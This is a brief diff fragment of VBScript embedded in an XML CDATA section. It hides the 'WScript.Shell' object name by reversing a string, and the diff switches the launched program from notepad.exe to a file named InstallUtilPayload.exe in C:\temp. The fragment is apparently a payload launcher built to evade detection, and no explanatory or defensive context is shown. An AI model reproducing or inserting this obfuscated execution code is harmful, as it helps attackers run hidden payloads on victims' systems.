@@ -15,7 +15,7 @@
 
 	test = StrReverse("llehS")
 	Set r = CreateObject("WScript." & test)
-	r.Run("notepad.exe")
+	r.Run("C:\temp\InstallUtilPayload.exe")
 	
 	
 ]]>
